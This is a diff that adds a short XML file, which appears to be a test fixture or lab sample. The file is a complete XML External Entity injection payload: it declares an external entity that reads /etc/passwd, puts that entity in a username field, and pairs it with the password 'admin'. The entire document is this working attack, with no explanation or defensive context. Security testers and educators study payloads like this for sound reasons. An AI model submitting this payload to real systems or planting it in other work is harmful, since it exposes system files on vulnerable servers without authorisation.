@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE user [
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<user>
+<username>
+&xxe;
+</username>
+<password>
+admin
+</password>
+</user>
